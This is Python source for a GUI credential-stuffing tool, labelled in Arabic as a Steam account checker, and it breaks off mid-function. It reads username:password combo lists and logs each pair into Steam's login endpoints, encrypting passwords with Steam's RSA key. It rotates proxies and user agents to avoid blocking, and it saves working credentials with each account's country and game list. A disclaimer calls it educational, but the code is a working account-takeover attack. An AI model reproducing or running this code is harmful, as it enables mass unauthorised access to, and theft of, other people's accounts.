import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import time
import json
import random
import requests
from fake_useragent import UserAgent
import rsa, base64, re, html
import os
from datetime import datetime

class ProfessionalSteamChecker:
    def __init__(self, root):
        self.root = root
        self.root.title("🎮 أداة فحص حسابات Steam المحترفة")
        self.root.geometry("1000x800")
        self.root.configure(bg='#2c3e50')
        
        # إعداد الثيم
        self.setup_style()
        
        # المتغيرات
        self.combo_file = tk.StringVar()
        self.proxy_file = tk.StringVar()
        self.threads_var = tk.IntVar(value=8)
        self.delay_var = tk.DoubleVar(value=1.5)
        self.timeout_var = tk.IntVar(value=15)
        self.debug_mode = tk.BooleanVar(value=False)
        self.running = False
        self.valid_accounts = []
        self.results = []
        self.checked_count = 0
        self.total_accounts = 0
        
        self.setup_ui()
        
    def setup_style(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # ألوان المظهر
        self.colors = {
            'primary': '#3498db',
            'success': '#2ecc71',
            'danger': '#e74c3c',
            'warning': '#f39c12',
            'dark': '#2c3e50',
            'light': '#ecf0f1',
            'secondary': '#95a5a6'
        }
        
    def setup_ui(self):
        # الهيدر
        self.setup_header()
        
        # إنشاء تبويبات
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=15, pady=10)
        
        # تبويب الفحص
        self.check_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.check_tab, text='🔍 فحص الحسابات')
        
        # تبويب النتائج
        self.results_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.results_tab, text='📊 النتائج')
        
        # تبويب الإعدادات
        self.settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_tab, text='⚙️ الإعدادات')
        
        # تبويب جديد للـ Response
        self.response_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.response_tab, text='📡 Response')
        
        self.setup_check_tab()
        self.setup_results_tab()
        self.setup_settings_tab()
        self.setup_response_tab()
        
    def setup_header(self):
        header_frame = ttk.Frame(self.root)
        header_frame.pack(fill='x', padx=15, pady=10)
        
        title_label = ttk.Label(header_frame, 
                               text="🎮 أداة فحص حسابات Steam المحترفة", 
                               font=('Arial', 16, 'bold'),
                               foreground=self.colors['primary'])
        title_label.pack(side='left')
        
        version_label = ttk.Label(header_frame, 
                                 text="v2.1 Professional + Debug", 
                                 font=('Arial', 10),
                                 foreground=self.colors['secondary'])
        version_label.pack(side='right')
        
    def setup_check_tab(self):
        # إطار الإدخال
        input_frame = ttk.LabelFrame(self.check_tab, text="⚙️ إعدادات الفحص", padding=15)
        input_frame.pack(fill='x', padx=10, pady=5)
        
        # ملف الكومبو
        ttk.Label(input_frame, text="📁 ملف الكومبو:", font=('Arial', 10, 'bold')).grid(row=0, column=0, sticky='w', pady=8)
        ttk.Entry(input_frame, textvariable=self.combo_file, width=60, font=('Arial', 10)).grid(row=0, column=1, padx=5, pady=8)
        ttk.Button(input_frame, text="استعراض", command=self.browse_combo, style='Primary.TButton').grid(row=0, column=2, padx=5, pady=8)
        
        # ملف البروكسيات
        ttk.Label(input_frame, text="🌐 ملف البروكسيات:", font=('Arial', 10, 'bold')).grid(row=1, column=0, sticky='w', pady=8)
        ttk.Entry(input_frame, textvariable=self.proxy_file, width=60, font=('Arial', 10)).grid(row=1, column=1, padx=5, pady=8)
        ttk.Button(input_frame, text="استعراض", command=self.browse_proxy, style='Primary.TButton').grid(row=1, column=2, padx=5, pady=8)
        
        # إعدادات الأداء
        settings_frame = ttk.Frame(input_frame)
        settings_frame.grid(row=2, column=0, columnspan=3, sticky='we', pady=15)
        
        ttk.Label(settings_frame, text="👥 عدد الثreads:", font=('Arial', 9, 'bold')).grid(row=0, column=0, padx=10)
        ttk.Spinbox(settings_frame, from_=1, to=20, textvariable=self.threads_var, width=8, font=('Arial', 10)).grid(row=0, column=1, padx=5)
        
        ttk.Label(settings_frame, text="⏰ التأخير (ثانية):", font=('Arial', 9, 'bold')).grid(row=0, column=2, padx=10)
        ttk.Spinbox(settings_frame, from_=0.5, to=5.0, increment=0.1, textvariable=self.delay_var, width=8, font=('Arial', 10)).grid(row=0, column=3, padx=5)
        
        ttk.Label(settings_frame, text="⏱️ المهلة (ثانية):", font=('Arial', 9, 'bold')).grid(row=0, column=4, padx=10)
        ttk.Spinbox(settings_frame, from_=5, to=30, textvariable=self.timeout_var, width=8, font=('Arial', 10)).grid(row=0, column=5, padx=5)
        
        # أزرار التحكم
        button_frame = ttk.Frame(input_frame)
        button_frame.grid(row=3, column=0, columnspan=3, pady=15)
        
        self.start_btn = ttk.Button(button_frame, text="▶️ بدء الفحص", command=self.start_checking, style='Success.TButton', width=15)
        self.start_btn.pack(side='left', padx=10)
        
        self.stop_btn = ttk.Button(button_frame, text="⏹️ إيقاف الفحص", command=self.stop_checking, style='Danger.TButton', width=15, state='disabled')
        self.stop_btn.pack(side='left', padx=10)
        
        self.export_btn = ttk.Button(button_frame, text="💾 تصدير النتائج", command=self.export_results, style='Primary.TButton', width=15)
        self.export_btn.pack(side='left', padx=10)
        
        # إطار التقدم
        progress_frame = ttk.LabelFrame(self.check_tab, text="📈 تقدم الفحص", padding=15)
        progress_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # شريط التقدم
        self.progress_bar = ttk.Progressbar(progress_frame, mode='determinate', style='TProgressbar')
        self.progress_bar.pack(fill='x', pady=10)
        
        # إحصائيات
        stats_frame = ttk.Frame(progress_frame)
        stats_frame.pack(fill='x', pady=10)
        
        stats_data = [
            ("✅ الحسابات الصالحة:", "valid_label", "#2ecc71"),
            ("❌ الحسابات غير الصالحة:", "invalid_label", "#e74c3c"),
            ("⚠️ الأخطاء:", "error_label", "#f39c12"),
            ("🔍 المفحوصة:", "checked_label", "#3498db"),
            ("⏱️ الوقت المنقضي:", "time_label", "#9b59b6")
        ]
        
        for i, (text, attr, color) in enumerate(stats_data):
            frame = ttk.Frame(stats_frame)
            frame.pack(side='left', padx=15, pady=5)
            ttk.Label(frame, text=text, font=('Arial', 9, 'bold'), foreground='white').pack()
            label = ttk.Label(frame, text="0", font=('Arial', 10, 'bold'), foreground=color)
            label.pack()
            setattr(self, attr, label)
        
        # سجل العمليات
        log_frame = ttk.Frame(progress_frame)
        log_frame.pack(fill='both', expand=True, pady=10)
        
        ttk.Label(log_frame, text="📝 سجل العمليات:", font=('Arial', 10, 'bold')).pack(anchor='w')
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, state='disabled', 
                                                 font=('Arial', 9), bg='#34495e', fg='white',
                                                 insertbackground='white')
        self.log_text.pack(fill='both', expand=True, pady=5)
        
    def setup_results_tab(self):
        # إطار النتائج
        results_frame = ttk.Frame(self.results_tab)
        results_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # شجرة النتائج
        columns = ('username', 'password', 'status', 'country', 'games_count', 'games', 'steamid')
        self.results_tree = ttk.Treeview(results_frame, columns=columns, show='headings', height=20)
        
        # عناوين الأعمدة
        columns_config = [
            ('username', 'اسم المستخدم', 120),
            ('password', 'كلمة المرور', 120),
            ('status', 'الحالة', 100),
            ('country', 'البلد', 80),
            ('games_count', 'عدد الألعاب', 90),
            ('games', 'الألعاب', 200),
            ('steamid', 'Steam ID', 120)
        ]
        
        for col, text, width in columns_config:
            self.results_tree.heading(col, text=text)
            self.results_tree.column(col, width=width)
        
        self.results_tree.pack(fill='both', expand=True, side='left')
        
        # شريط التمرير
        scrollbar = ttk.Scrollbar(results_frame, orient='vertical', command=self.results_tree.yview)
        scrollbar.pack(side='right', fill='y')
        self.results_tree.configure(yscrollcommand=scrollbar.set)
        
        # ربط حدث النقر
        self.results_tree.bind('<<TreeviewSelect>>', self.on_tree_select)
        
        # إطار التفاصيل
        details_frame = ttk.LabelFrame(self.results_tab, text="📋 تفاصيل الحساب", padding=10)
        details_frame.pack(fill='x', padx=10, pady=5)
        
        self.details_text = scrolledtext.ScrolledText(details_frame, height=6, state='disabled',
                                                     font=('Arial', 9), bg='#34495e', fg='white')
        self.details_text.pack(fill='x', pady=5)
        
    def setup_settings_tab(self):
        settings_frame = ttk.LabelFrame(self.settings_tab, text="🛠️ الإعدادات المتقدمة", padding=20)
        settings_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # إعدادات البروكسي
        proxy_frame = ttk.LabelFrame(settings_frame, text="🌐 إعدادات البروكسي", padding=10)
        proxy_frame.pack(fill='x', pady=10)
        
        self.rotate_proxy = tk.BooleanVar(value=True)
        self.auto_user_agent = tk.BooleanVar(value=True)
        self.auto_save = tk.BooleanVar(value=True)
        self.save_valid_only = tk.BooleanVar(value=False)
        
        ttk.Checkbutton(proxy_frame, text="استخدام البروكسيات العشوائية", variable=self.rotate_proxy).pack(anchor='w', pady=2)
        ttk.Checkbutton(proxy_frame, text="تغيير User-Agent تلقائياً", variable=self.auto_user_agent).pack(anchor='w', pady=2)
        
        # إعدادات الحفظ
        save_frame = ttk.LabelFrame(settings_frame, text="💾 إعدادات الحفظ", padding=10)
        save_frame.pack(fill='x', pady=10)
        
        ttk.Checkbutton(save_frame, text="حفظ النتائج تلقائياً", variable=self.auto_save).pack(anchor='w', pady=2)
        ttk.Checkbutton(save_frame, text="حفظ الحسابات الصالحة فقط", variable=self.save_valid_only).pack(anchor='w', pady=2)
        
        # معلومات الأداة
        info_frame = ttk.LabelFrame(settings_frame, text="ℹ️ معلومات الأداة", padding=15)
        info_frame.pack(fill='x', pady=10)
        
        info_text = """🎮 أداة فحص حسابات Steam المحترفة v2.1

المميزات:
• فحص حسابات متعددة باستخدام ملف كومبو
• دعم البروكسيات للفحص الآمن
• واجهة مستخدم رسومية محسنة
• استخراج معلومات مفصلة عن الحسابات
• عرض الألعاب والبلد والتقييم
• نظام تسجيل Response متقدم
• حفظ النتائج بتنسيقات متعددة
• فحص سريع ومتعدد الخيوط

🛡️ ملاحظة: هذه الأداة للأغراض التعليمية فقط
⚖️ يرجى استخدامها بشكل قانوني وأخلاقي
تمت  برمجة الاداة  بواسطة المهيب @F5FFF
"""

        info_label = ttk.Label(info_frame, text=info_text, justify='left', font=('Arial', 9))
        info_label.pack(anchor='w')
        
    def setup_response_tab(self):
        """تبويب جديد لعرض الـ Response والتفاصيل الفنية"""
        response_frame = ttk.Frame(self.response_tab)
        response_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # عناصر التحكم
        control_frame = ttk.Frame(response_frame)
        control_frame.pack(fill='x', pady=5)
        
        ttk.Checkbutton(control_frame, text="تفعيل وضع التصحيح (Debug Mode)", 
                       variable=self.debug_mode).pack(side='left', padx=5)
        
        ttk.Button(control_frame, text="مسح السجل", 
                  command=self.clear_response_log).pack(side='right', padx=5)
        
        # منطقة عرض الـ Response
        ttk.Label(response_frame, text="سجل الـ Response والتفاصيل الفنية:", 
                 font=('Arial', 10, 'bold')).pack(anchor='w', pady=5)
        
        self.response_text = scrolledtext.ScrolledText(response_frame, 
                                                     height=25, 
                                                     state='disabled',
                                                     font=('Consolas', 9), 
                                                     bg='#1e1e1e', 
                                                     fg='#00ff00',
                                                     insertbackground='white')
        self.response_text.pack(fill='both', expand=True, pady=5)
        
    def clear_response_log(self):
        """مسح سجل الـ Response"""
        self.response_text.config(state='normal')
        self.response_text.delete(1.0, 'end')
        self.response_text.config(state='disabled')
        
    def log_response(self, message, level="INFO"):
        """تسجيل رسائل الـ Response في التبويب المخصص"""
        if not self.debug_mode.get():
            return
            
        self.response_text.config(state='normal')
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        colors = {
            "INFO": "#3498db",
            "REQUEST": "#f39c12", 
            "RESPONSE": "#2ecc71",
            "ERROR": "#e74c3c",
            "DEBUG": "#9b59b6",
            "SUCCESS": "#2ecc71"
        }
        
        color = colors.get(level, "#3498db")
        
        tag_name = f"tag_{level}"
        self.response_text.tag_config(tag_name, foreground=color)
        
        self.response_text.insert('end', f"[{timestamp}] ", "timestamp")
        self.response_text.insert('end', f"{message}\n", tag_name)
        self.response_text.see('end')
        self.response_text.config(state='disabled')
        
        self.response_text.tag_config("timestamp", foreground="#95a5a6")
        
    def browse_combo(self):
        filename = filedialog.askopenfilename(
            title="اختر ملف الكومبو",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.combo_file.set(filename)
            self.log_message(f"📁 تم تحميل ملف الكومبو: {filename}", "info")
            
    def browse_proxy(self):
        filename = filedialog.askopenfilename(
            title="اختر ملف البروكسيات",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.proxy_file.set(filename)
            self.log_message(f"🌐 تم تحميل ملف البروكسيات: {filename}", "info")
            
    def log_message(self, message, level="info"):
        self.log_text.config(state='normal')
        timestamp = time.strftime("%H:%M:%S")
        
        colors = {
            "info": "#3498db",
            "success": "#2ecc71",
            "warning": "#f39c12",
            "error": "#e74c3c"
        }
        
        color = colors.get(level, "#3498db")
        self.log_text.insert('end', f"[{timestamp}] ", "timestamp")
        self.log_text.insert('end', f"{message}\n", level)
        self.log_text.see('end')
        self.log_text.config(state='disabled')
        
        # تنسيق النص
        self.log_text.tag_config("timestamp", foreground="#95a5a6")
        self.log_text.tag_config("info", foreground=colors["info"])
        self.log_text.tag_config("success", foreground=colors["success"])
        self.log_text.tag_config("warning", foreground=colors["warning"])
        self.log_text.tag_config("error", foreground=colors["error"])
        
        self.root.update()
        
    def update_stats(self, valid=0, invalid=0, error=0, checked=0, total=0):
        self.valid_label.config(text=str(valid))
        self.invalid_label.config(text=str(invalid))
        self.error_label.config(text=str(error))
        self.checked_label.config(text=f"{checked}/{total}")
        
        if total > 0:
            progress = (checked / total) * 100
            self.progress_bar['value'] = progress
            
        # تحديث الوقت المنقضي
        if hasattr(self, 'start_time'):
            elapsed = time.time() - self.start_time
            self.time_label.config(text=f"{int(elapsed)}s")
        
    def add_to_results_tree(self, result):
        if result['status'] == 'valid':
            tags = ('valid',)
            status_text = "✅ صالح"
            status_display = "صالح"
        elif result['status'] == 'invalid':
            tags = ('invalid',)
            status_text = "❌ غير صالح"
            status_display = "غير صالح"
        else:
            tags = ('error',)
            status_text = "⚠️ خطأ"
            status_display = "خطأ"
            
        # استخراج المعلومات
        games_count = 0
        games_list = []
        country = "Unknown"
        steamid = ""
        
        if result.get('data'):
            profile = result['data'].get('profile', {})
            games_info = result['data'].get('games', {})
            
            games_count = games_info.get('total', 0)
            games_list = games_info.get('games', [])
            country = profile.get('country', 'Unknown')
            steamid = profile.get('steamid', '')
            
        # تقليم قائمة الألعاب لعرضها في العمود
        games_display = " | ".join(games_list[:3])  # عرض أول 3 ألعاب فقط
        if len(games_list) > 3:
            games_display += f" ... (+{len(games_list)-3})"
            
        self.results_tree.insert('', 'end', values=(
            result['username'],
            result['password'],
            status_display,
            country,
            games_count,
            games_display,
            steamid
        ), tags=tags, iid=result['username'])
        
    def on_tree_select(self, event):
        selection = self.results_tree.selection()
        if not selection:
            return
            
        item = selection[0]
        values = self.results_tree.item(item, 'values')
        
        if values:
            username, password, status, country, games_count, games, steamid = values
            
            # البحث عن النتيجة الكاملة
            full_result = next((r for r in self.results if r['username'] == username), None)
            
            if full_result:
                self.show_account_details(full_result)
                
    def show_account_details(self, result):
        self.details_text.config(state='normal')
        self.details_text.delete(1.0, 'end')
        
        details = []
        details.append(f"👤 اسم المستخدم: {result['username']}")
        details.append(f"🔑 كلمة المرور: {result['password']}")
        details.append(f"📊 الحالة: {'✅ صالح' if result['status'] == 'valid' else '❌ غير صالح'}")
        details.append("")
        
        if result.get('data'):
            profile = result['data'].get('profile', {})
            games_info = result['data'].get('games', {})
            
            details.append("📋 معلومات الملف الشخصي:")
            details.append(f"   🆔 Steam ID: {profile.get('steamid', 'N/A')}")
            details.append(f"   🌍 البلد: {profile.get('country', 'N/A')}")
            details.append(f"   📍 الحالة: {profile.get('state', 'N/A')}")
            details.append(f"   🔗 الرابط: {profile.get('profile_url', 'N/A')}")
            details.append("")
            
            details.append("🎮 معلومات الألعاب:")
            details.append(f"   📊 عدد الألعاب: {games_info.get('total', 0)}")
            
            games_list = games_info.get('games', [])
            if games_list:
                details.append("   🎯 الألعاب:")
                for game in games_list[:10]:  # عرض أول 10 ألعاب فقط
                    details.append(f"      • {game}")
                if len(games_list) > 10:
                    details.append(f"      ... وغيرها {len(games_list)-10} لعبة")
            else:
                details.append("   🎯 لا توجد ألعاب")
                
        else:
            details.append("❌ لا توجد بيانات إضافية")
            
        details_text = "\n".join(details)
        self.details_text.insert(1.0, details_text)
        self.details_text.config(state='disabled')
        
    def start_checking(self):
        if not self.combo_file.get():
            messagebox.showerror("خطأ", "❌ يجب اختيار ملف الكومبو أولاً")
            return
            
        self.running = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.start_time = time.time()
        
        # مسح النتائج السابقة
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
            
        self.valid_accounts = []
        self.results = []
        self.checked_count = 0
        
        # بدء الفحص في thread منفصل
        thread = threading.Thread(target=self.run_checking)
        thread.daemon = True
        thread.start()
        
        self.log_message("🚀 بدء عملية الفحص...", "info")
        
    def stop_checking(self):
        self.running = False
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.log_message("⏹️ تم إيقاف الفحص بواسطة المستخدم", "warning")
        
    def run_checking(self):
        try:
            checker = SteamChecker()
            checker.set_response_callback(self.log_response)  # تمرير دالة التسجيل
            
            accounts = checker.load_combo_file(self.combo_file.get())
            self.total_accounts = len(accounts)
            
            proxies = None
            if self.proxy_file.get():
                proxies = checker.load_proxy_file(self.proxy_file.get())
                self.log_message(f"🌐 تم تحميل {len(proxies)} بروكسي", "info")
                
            self.log_message(f"🔍 بدء فحص {self.total_accounts} حساب", "info")
            
            valid_count = 0
            invalid_count = 0
            error_count = 0
            
            for i, account in enumerate(accounts):
                if not self.running:
                    break
                    
                username, password = account
                self.log_message(f"🔎 جاري فحص: {username}", "info")
                
                # تمرير وضع التصحيح
                result = checker.process_account(account, proxies, self.timeout_var.get(), self.debug_mode.get())
                self.results.append(result)
                self.checked_count = i + 1
                
                if result['status'] == 'valid':
                    valid_count += 1
                    self.valid_accounts.append(result)
                    self.log_message(f"✅ حساب صالح: {username} | الدولة: {result.get('data', {}).get('profile', {}).get('country', 'Unknown')} | الألعاب: {result.get('data', {}).get('games', {}).get('total', 0)}", "success")
                elif result['status'] == 'invalid':
                    invalid_count += 1
                    self.log_message(f"❌ حساب غير صالح: {username}", "error")
                else:
                    error_count += 1
                    self.log_message(f"⚠️ خطأ في: {username} - {result.get('error', 'Unknown error')}", "warning")
                
                # تحديث الواجهة
                self.root.after(0, self.add_to_results_tree, result)
                self.root.after(0, self.update_stats, valid_count, invalid_count, error_count, i+1, self.total_accounts)
                
                time.sleep(self.delay_var.get())
                
            # حفظ النتائج تلقائياً
            if self.auto_save.get() and self.results:
                self.save_results_auto()
                
            self.log_message(f"🎊 اكتمل الفحص: {valid_count} ✅ صالح | {invalid_count} ❌ غير صالح | {error_count} ⚠️ أخطاء", "success")
            
        except Exception as e:
            self.log_message(f"💥 خطأ في الفحص: {str(e)}", "error")
        finally:
            self.root.after(0, self.stop_checking)
            
    def save_results_auto(self):
        """حفظ النتائج تلقائياً"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_filename = f"steam_results_{timestamp}"
            
            # حفظ جميع النتائج
            results_file = f"{base_filename}_all.json"
            with open(results_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            # حفظ الحسابات الصالحة
            if self.valid_accounts:
                valid_file = f"{base_filename}_valid.txt"
                with open(valid_file, 'w', encoding='utf-8') as f:
                    for account in self.valid_accounts:
                        f.write(f"{account['username']}:{account['password']}\n")
                
                # حفظ بتنسيق محترف
                professional_file = f"{base_filename}_professional.txt"
                with open(professional_file, 'w', encoding='utf-8') as f:
                    for account in self.valid_accounts:
                        profile = account.get('data', {}).get('profile', {})
                        games_info = account.get('data', {}).get('games', {})
                        
                        country = profile.get('country', 'Unknown')
                        games_count = games_info.get('total', 0)
                        games_list = games_info.get('games', [])
                        
                        games_str = " | ".join(games_list[:5])  # عرض أول 5 ألعاب فقط
                        
                        line = f"{account['username']}:{account['password']} | Country: {country} | All Games: {games_count} | Games: {games_str}\n"
                        f.write(line)
            
            self.log_message(f"💾 تم الحفظ التلقائي: {base_filename}_*", "success")
            
        except Exception as e:
            self.log_message(f"❌ خطأ في الحفظ التلقائي: {str(e)}", "error")
            
    def export_results(self):
        if not self.results:
            messagebox.showwarning("تحذير", "⚠️ لا توجد نتائج لتصديرها")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[
                ("Text files", "*.txt"),
                ("JSON files", "*.json"),
                ("All files", "*.*")
            ]
        )
        
        if filename:
            try:
                if filename.endswith('.json'):
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(self.results, f, indent=2, ensure_ascii=False)
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        for result in self.results:
                            if result['status'] == 'valid' and self.save_valid_only.get():
                                f.write(f"{result['username']}:{result['password']}\n")
                            elif not self.save_valid_only.get():
                                status = "صالح" if result['status'] == 'valid' else "غير صالح"
                                f.write(f"{result['username']}:{result['password']} | {status}\n")
                
                messagebox.showinfo("نجاح", f"✅ تم تصدير النتائج إلى: {filename}")
            except Exception as e:
                messagebox.showerror("خطأ", f"❌ فشل التصدير: {str(e)}")

class SteamChecker:
    def __init__(self):
        self.results = []
        self.valid_accounts = []
        self.lock = threading.Lock()
        self.response_callback = None
    
    def set_response_callback(self, callback):
        """تعيين دالة callback لتسجيل الـ Response"""
        self.response_callback = callback
    
    def log_response(self, message, level="INFO"):
        """تسجيل رسالة Response عبر الـ callback"""
        if self.response_callback:
            self.response_callback(message, level)
    
    def process_account(self, account_data, proxy_list=None, timeout=15, debug_mode=False):
        username, password = account_data
        proxy = None
        
        if proxy_list:
            proxy = self.get_random_proxy(proxy_list)
        
        try:
            steam = Steam(proxy=proxy, timeout=timeout, debug_mode=debug_mode)
            steam.set_response_callback(self.log_response)  # تمرير callback إلى Steam
            
            if steam.login(username.strip(), password.strip()):
                account_info = steam.check_account_status()
                result = {
                    'username': username,
                    'password': password,
                    'status': 'valid',
                    'proxy': proxy,
                    'data': account_info
                }
                steam.close()
                return result
            else:
                result = {
                    'username': username,
                    'password': password,
                    'status': 'invalid',
                    'proxy': proxy,
                    'data': None
                }
                return result
                
        except Exception as e:
            result = {
                'username': username,
                'password': password,
                'status': 'error',
                'proxy': proxy,
                'error': str(e)
            }
            return result
    
    def get_random_proxy(self, proxy_list):
        return random.choice(proxy_list) if proxy_list else None
    
    def load_combo_file(self, filename):
        accounts = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        username, password = line.split(':', 1)
                        accounts.append((username, password))
            return accounts
        except Exception as e:
            raise Exception(f"خطأ في تحميل ملف الكومبو: {e}")
    
    def load_proxy_file(self, filename):
        proxies = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
            return proxies
        except Exception as e:
            raise Exception(f"خطأ في تحميل ملف البروكسي: {e}")

class Steam:
    def __init__(self, proxy=None, timeout=15, debug_mode=False):
        self.session = requests.Session()
        self.ua = UserAgent()
        self.UserAgent = self.ua.google
        self.timeout = timeout
        self.dono = str(int(time.time() * 1000))
        self.vaild = False
        self.steamid = None
        self.sessionid = None
        self.steamLoginSecure = None
        self.debug_mode = debug_mode
        self.response_callback = None
        
        if proxy:
            self.set_proxy(proxy)
    
    def set_response_callback(self, callback):
        """تعيين دالة callback لتسجيل الـ Response"""
        self.response_callback = callback
    
    def log_response(self, message, level="INFO"):
        """تسجيل رسالة Response عبر الـ callback"""
        if self.response_callback and self.debug_mode:
            self.response_callback(message, level)
    
    def set_proxy(self, proxy):
        try:
            proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
            self.session.proxies.update(proxies)
            self.log_response(f"🔧 تم تعيين البروكسي: {proxy}", "DEBUG")
        except Exception as e:
            self.log_response(f"❌ خطأ في تعيين البروكسي: {e}", "ERROR")
    
    def rotate_user_agent(self):
        new_ua = self.ua.random
        self.UserAgent = new_ua
        self.log_response(f"🔄 تغيير User-Agent إلى: {new_ua}", "DEBUG")
        return self.UserAgent
    
    def get_rsa_key(self, username):
        data = {
            "donotcache": self.dono,
            "username": username
        }
        headers = {
            "User-Agent": self.UserAgent,
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://steamcommunity.com",
            "Referer": "https://steamcommunity.com/login/home/?goto="
        }
        
        self.log_response(f"📤 إرسال طلب RSA Key لـ: {username}", "REQUEST")
        self.log_response(f"📦 بيانات الطلب: {data}", "DEBUG")
        
        try:
            response = self.session.post(
                "https://steamcommunity.com/login/getrsakey/", 
                data=data, 
                headers=headers,
                timeout=self.timeout
            )
            
            # تسجيل تفاصيل الـ Response
            self.log_response(f"📥 استجابة RSA Key - Status: {response.status_code}", "RESPONSE")
            self.log_response(f"📋 محتوى الـ Response: {response.text[:500]}...", "DEBUG")
            
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    self.log_response("✅ نجح الحصول على مفتاح RSA", "INFO")
                    return data["publickey_mod"], data["publickey_exp"], data["timestamp"]
                else:
                    self.log_response(f"❌ فشل الحصول على مفتاح RSA: {data.get('message', 'Unknown error')}", "ERROR")
            else:
                self.log_response(f"❌ استجابة غير ناجحة: {response.status_code}", "ERROR")
                
            return None, None, None
            
        except Exception as e:
            self.log_response(f"💥 استثناء في get_rsa_key: {e}", "ERROR")
            return None, None, None
    
    def encrypt_password(self, password, publickey_mod, publickey_exp):
        try:
            publickey_mod = publickey_mod.replace("\\", "").replace("\"", "")
            publickey_exp = publickey_exp.replace("\\", "").replace("\"", "")
            
            n = int(publickey_mod, 16)
            e = int(publickey_exp, 16)
            
            public_key = rsa.PublicKey(n, e)
            encrypted_password = rsa.encrypt(password.encode('utf-8'), public_key)
            encrypted_password_b64 = base64.b64encode(encrypted_password).decode('utf-8')
            
            self.log_response("🔐 تم تشفير كلمة المرور بنجاح", "DEBUG")
            return encrypted_password_b64
            
        except Exception as e:
            self.log_response(f"❌ خطأ في تشفير كلمة المرور: {e}", "ERROR")
            return None
    
    def login(self, username, password):
        try:
            self.rotate_user_agent()
            
            publickey_mod, publickey_exp, timestamp = self.get_rsa_key(username)
            if not all([publickey_mod, publickey_exp, timestamp]):
                self.log_response("❌ فشل في الحصول على مفتاح RSA", "ERROR")
                return False

            encrypted_password = self.encrypt_password(password, publickey_mod, publickey_exp)
            if not encrypted_password:
                self.log_response("❌ فشل في تشفير كلمة المرور", "ERROR")
                return False
            
            data = {
                "donotcache": self.dono,
                "password": encrypted_password,
                "username": username,
                "twofactorcode": "",
                "emailauth": "",
                "loginfriendlyname": "",
                "captchagid": "-1",
                "captcha_text": "",
                "emailsteamid": "",
                "rsatimestamp": timestamp,
                "remember_login": "false",
                "oauth_client_id": "DE45CD61",
            }
            
            headers = {
                "User-Agent": self.UserAgent,
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://steamcommunity.com",
                "Referer": "https://steamcommunity.com/login/home/?goto=",
            }
            
            self.log_response(f"📤 إرسال طلب تسجيل الدخول لـ: {username}", "REQUEST")
            self.log_response(f"📦 بيانات تسجيل الدخول (مشفرة): { {k: '***' if k == 'password' else v for k, v in data.items()} }", "DEBUG")
            
            response = self.session.post(
                "https://steamcommunity.com/login/dologin/", 
                data=data, 
                headers=headers, 
                timeout=self.timeout
            )
            
            self.log_response(f"📥 استجابة تسجيل الدخول - Status: {response.status_code}", "RESPONSE")
            self.log_response(f"📋 محتوى الـ Response: {response.text[:1000]}...", "DEBUG")
            
            if response.status_code == 200:
                login_data = response.json()
                
                if login_data.get("success"):
                    transfer_params = login_data.get("transfer_parameters", {})
                    self.steamid = transfer_params.get("steamid")
                    self.vaild = True
                    
                    if 'sessionid' in self.session.cookies:
                        self.sessionid = self.session.cookies['sessionid']
                    if 'steamLoginSecure' in self.session.cookies:
                        self.steamLoginSecure = self.session.cookies['steamLoginSecure']
                    
                    self.log_response(f"✅ تسجيل الدخول ناجح - SteamID: {self.steamid}", "SUCCESS")
                    return True
                else:
                    error_msg = login_data.get('message', 'Unknown error')
                    self.log_response(f"❌ فشل تسجيل الدخول: {error_msg}", "ERROR")
                    return False
            else:
                self.log_response(f"❌ استجابة غير ناجحة: {response.status_code}", "ERROR")
                return False
                
        except Exception as e:
            self.log_response(f"💥 استثناء في تسجيل الدخول: {e}", "ERROR")
            return False
    
    def is_valid(self):
        if not self.vaild or not self.steamid:
            return False
            
        try:
            headers = {"User-Agent": self.UserAgent}
            
            self.log_response(f"🔍 التحقق من صحة الجلسة - SteamID: {self.steamid}", "DEBUG")
            
            response = self.session.get(
                f"https://steamcommunity.com/profiles/{self.steamid}/?xml=1", 
                headers=headers, 
                timeout=self.timeout
            )
            
            self.log_response(f"📥 استجابة التحقق من الصحة - Status: {response.status_code}", "RESPONSE")
            
            checks = [
                response.status_code == 200,
                str(self.steamid) in response.text,
                "profile_fatalerror" not in response.text,
            ]
            
            is_valid = all(checks)
            self.log_response(f"✅ الجلسة {'صالحة' if is_valid else 'غير صالحة'}", "INFO")
            
            return is_valid
            
        except Exception as e:
            self.log_response(f"💥 استثناء في التحقق من الصحة: {e}", "ERROR")
            return False
    
    def get_profile_info(self):
        if not self.vaild:
            return None
            
        try:
